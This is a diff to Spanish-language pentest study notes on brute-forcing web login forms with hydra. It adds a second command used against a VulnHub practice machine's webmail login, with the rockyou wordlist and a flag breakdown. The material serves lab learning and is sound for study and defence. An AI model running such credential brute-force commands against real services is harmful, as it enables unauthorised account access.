@@ -10,7 +10,15 @@ Ahora con la herramienta `hydra` vamos a proceder a hacer fuerza bruta:
 hydra -t 64 -l admin -P /usr/share/SecLists/rockyou.txt 172.17.0.3 http-post-form "/login.php:username=a&password=^PASS^:Credenciales incorrectas."
 ```
 
- Desglose del comando:
+otra forma de ejecutar (maquina Insanity vulnhub):
+
+```
+hydra -l otis -P /usr/share/SecLists/rockyou.txt "http-post-form://192.168.1.36/webmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect."
+```
+
+![[Pasted image 20250729194915.png]]
+
+ Desglose del comando 1:
 
 **`hydra`** - Es la herramienta principal para ataques de fuerza bruta contra servicios de autenticación.
 **`-t 64`** - Especifica el número de hilos (threads) concurrentes. En este caso, 64 conexiones simultáneas para acelerar el ataque.
